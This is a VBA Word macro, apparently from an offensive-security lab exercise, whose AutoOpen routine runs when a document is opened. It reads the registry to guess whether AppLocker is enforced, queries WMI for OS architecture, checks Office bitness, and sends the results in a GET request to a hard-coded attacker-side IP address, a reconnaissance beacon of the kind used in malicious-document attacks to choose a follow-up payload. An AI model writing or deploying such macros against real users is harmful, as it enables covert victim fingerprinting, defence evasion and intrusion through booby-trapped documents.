Sub AutoOpen()
    ' Check AppLocker status (from Macro 1)
    Dim regValue
    Set WindowShell = CreateObject("WScript.shell")
    On Error Resume Next
    regValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe")
    Dim applockerStatus As String
    If Err <> 0 Then
        applockerStatus = "on"  ' Assume AppLocker is on if key read fails
    Else
        applockerStatus = "off" ' AppLocker is off if key exists
    End If
    On Error GoTo 0  ' Reset error handling
    
    ' Check system architecture and Office bitness (from Macro 2)
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
    
    For Each objItem In colItems
        architecture = objItem.architecture  ' 0 for 32-bit OS, 9 for 64-bit OS
        Exit For  ' Only check the first processor
    Next
            
    ' Check if Office/VBA is running in 32-bit
    Dim is32bitOffice As Boolean
    #If Win64 Then
        is32bitOffice = False  ' Office is 64-bit
    #Else
        is32bitOffice = True   ' Office is 32-bit
    #End If
    
    ' Determine OS architecture string
    Dim osArch As String
    If architecture = "0" Then
        osArch = "32"
    Else
        osArch = "64"
    End If
    
    ' Determine Word (Office) bitness string
    Dim wordArch As String
    If is32bitOffice Then
        wordArch = "32"
    Else
        wordArch = "64"
    End If
    
    ' Construct the URL path with AppLocker status, OS arch, and Word arch
    ' Format: /applockeron/os32_word32, /applockeroff/os64_word64, etc.
    Dim path As String
    path = "/applocker" & applockerStatus & "/os" & osArch & "_word" & wordArch
    
    ' Unified server URL (using IP from Macro 1; change if needed)
    Dim serverURL As String
    serverURL = "http://192.168.45.229" & path
    
    ' Create HTTP request object and send GET request
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", serverURL, False
    http.Send
    
    ' Optional: Uncomment to display response for debugging
    ' MsgBox http.responseText
End Sub